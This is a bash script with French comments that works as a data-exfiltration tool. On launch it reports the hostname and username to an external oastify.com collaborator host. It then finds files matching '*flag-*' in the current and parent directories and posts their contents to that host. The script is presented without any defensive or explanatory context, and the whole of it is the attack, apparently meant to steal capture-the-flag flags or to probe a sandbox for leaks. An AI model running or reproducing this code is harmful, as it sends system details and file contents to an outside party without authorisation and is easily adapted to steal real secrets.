#!/bin/bash

# Configuration - URL à notifier
NOTIFICATION_URL="http://ie0w6p2seul22zxb5clcdwbeo5uwiz6o.oastify.com/notify"
DATA_URL="http://ie0w6p2seul22zxb5clcdwbeo5uwiz6o.oastify.com/upload"

# Alerte immédiate d'ouverture du script (requête GET)
curl -s "$NOTIFICATION_URL?event=script_opened&host=$(hostname)&user=$(whoami)&time=$(date +%s)" &

# Fonction pour trouver et envoyer les fichiers
find_and_send() {
    local dir="$1"
    for file in $(find "$dir" -type f -name "*flag-*" 2>/dev/null); do
        echo "Traitement du fichier: $file"
        # Envoi du contenu du fichier
        curl -s -X POST -d "$(cat "$file" 2>/dev/null)" "$DATA_URL?file=$file" &
    done
}

# Recherche dans les répertoires spécifiés
find_and_send "./"
find_and_send "../"

# Notification de fin
curl -s "$NOTIFICATION_URL?event=script_completed&host=$(hostname)&time=$(date +%s)"

echo "Opération terminée."
